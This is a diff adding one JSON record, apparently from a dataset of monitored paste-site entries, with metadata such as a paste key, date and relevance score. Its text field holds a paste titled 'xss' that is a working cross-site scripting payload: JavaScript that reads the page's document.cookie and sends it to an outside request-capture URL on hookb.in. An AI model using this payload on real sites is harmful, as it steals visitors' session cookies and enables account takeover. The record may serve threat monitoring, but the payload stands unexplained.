@@ -1,0 +1,14 @@
+{
+ "espireDate": "N",
+ "format": "text",
+ "jSonReasons": [
+  "lg_ca",
+  "re_url"
+ ],
+ "key": "2jJtJ6YU",
+ "pasteDate": "Feb 17, 2018, 11:13:23 PM",
+ "relevancy": 1.0,
+ "relevant": false,
+ "text": "var xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://hookb.in/KG7dVMQX?usage=XSS&cookie=' + encodeURIComponent(document.cookie) + '&flexstress');\nxhr.send(null);",
+ "title": "xss"
+}
